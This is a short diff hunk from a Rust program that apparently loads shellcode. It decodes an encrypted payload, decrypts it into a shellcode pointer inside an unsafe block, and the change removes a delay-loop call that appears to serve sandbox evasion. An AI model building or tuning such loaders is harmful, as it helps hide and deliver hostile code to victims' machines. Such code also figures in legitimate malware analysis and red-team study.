@@ -79,8 +79,6 @@ fn main() {
 
     let decrypted_data = decode_payload(&encrypted_data).unwrap();
 
-    utils::delay_loop();
-
     unsafe {
         let (shellcode_ptr, shellcode_len) = match decrypt(&decrypted_data) {
             Ok(p) => {
